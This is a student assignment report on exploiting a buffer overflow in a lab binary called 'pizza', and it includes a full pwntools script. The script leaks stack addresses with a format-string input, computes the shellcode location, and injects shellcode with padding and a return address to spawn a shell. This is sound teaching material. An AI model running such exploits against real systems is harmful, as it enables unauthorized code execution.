# Assignment 10 Report

## Assignment summary

This assignment is focused on understanding and exploiting a buffer overflow vulnerability in a provided program called "pizza". The goal is to write a Python script using the pwntools library to execute the program, leak the stack offset, and spawn a shell.
Steps:

1. Install the pwntools library and download the vulnerable "pizza" program.
2. Analyze the program's behavior, including crashing it and exploring format string vulnerabilities.
3. Create a pwntools script to run the program, cause a segmentation fault, and analyze the core dump.
4. Design the script to:
   
- Find the number of bytes before the return address on the stack.
- Inject padding bytes, a new return address, and shellcode into the buffer.
- Predict the address where the shellcode will be located and return to it.

Buffer Overflow definition:
A buffer overflow is a type of software vulnerability that occurs when a program writes more data to a buffer than the allocated space in memory can hold. This can lead to overwriting adjacent memory areas, including critical data structures like return addresses on the stack. Attackers can exploit this vulnerability by carefully crafting input data that overwrites the return address with a pointer to malicious code (shellcode), allowing them to hijack the program's control flow and execute arbitrary code with the same privileges as the vulnerable program. Buffer overflows have been a major security concern historically, as they provide a way for attackers to gain unauthorized access and control over systems.

## Program
```
from pwn import *

# Function to print stack elements around the stack pointer (RSP)
def print_stack(core, num):
    rsp = core.rsp
    print("---- STACK ----")

    # Print elements before RSP
    start_address = rsp - num * 8
    for addr in range(start_address, rsp, 8):
        val = core.read(addr, 8)  # Read 8 bytes of memory at address 'addr'
        print(f"0x{addr:016x}:   {str(val)}")  # Print address and its value

    # Print elements after RSP
    print(f"RSP -> 0x{rsp:016x}:   {str(core.read(rsp, 8))}")  # Print RSP and its value
    for addr in range(rsp + 8, rsp + (num + 1) * 8, 8):  # Iterate over addresses after RSP
        val = core.read(addr, 8)  # Read 8 bytes of memory at address 'addr'
        print(f"0x{addr:016x}:   {str(val)}")  # Print address and its value


# Load the ELF binary
elf = ELF("./pizza")

# Set up the context for the binary
context(arch='amd64', os='linux', endian='little', word_size=64)

# Generate shellcode for spawning a shell
shellcode = asm(shellcraft.amd64.linux.sh())

# Start the vulnerable program
victim = process("./pizza")

# Send input to trigger vulnerability and crash the program
input1 = b"%p %p %p %p %p %p %p %p %p"
victim.sendline(input1)  # Send the input

# Receive and print the response
print(str(victim.recvline(), "latin-1"))

# Receive and store the vulnerable address from the program's response
var = str(victim.recvline(), "latin-1")
print(var)

# Calculate the address to inject the shellcode
addr = int(var.split(" ")[7],16) - 112

# Craft the payload with shellcode and padding
input2 = shellcode + b"A" * 88 + addr.to_bytes(8, 'little')

# Send input to trigger the shellcode injection
var = str(victim.recvline(), "latin-1")
victim.sendline(b"4")
victim.sendline(input2)  # Send the payload

# Interact with the program to receive a shell
victim.interactive()

# Wait for the program to finish (not necessary after interactive)
victim.wait()

# core = victim.corefile
# print_stack(core, 100)

# Exit the script
exit()

```

## Screenshot
Testing print_stack function

![image](https://github.com/l3naz/CS479-579-Reverse-Engineering-Report/assets/122416778/1ccfb86b-05d0-4df7-a656-8376ce5366e6)

Testing Program

![image](https://github.com/l3naz/CS479-579-Reverse-Engineering-Report/assets/122416778/0a970008-03b2-4960-ad98-7d20acd05c11)


## Explain Program

- input1 = b"%p %p %p %p %p %p %p %p %p". Using format string to leak the addresses from the stack. This is a way to defeat the ASLR protection. The addresses will be printed back, and by knowing the stack layout, I can calculate the address of your shellcode which will be placed later in the stack.
- Find offset: letting the program crash by putting in the wrong address (print multiple letter 'A'), analyze corefiles and build a print_stack function to find out the address of the shellcode. Then subtract the leak address with the shellcode to find out the offset.
- Since we have the offset, we can finish the payload by adding up shellcode, padding and offset. input2 = shellcode + b"A"*88 + addr.to_bytes(8, 'little'). This input starts with your shellcode, followed by padding of 88 bytes, and finally the offset that we found. The padding is used to fill the buffer up to the point where the return address is stored.
- victim.interactive()  interactive mode with the victim process, allowing us to execute arbitrary commands via the shell that your shellcode spawned.

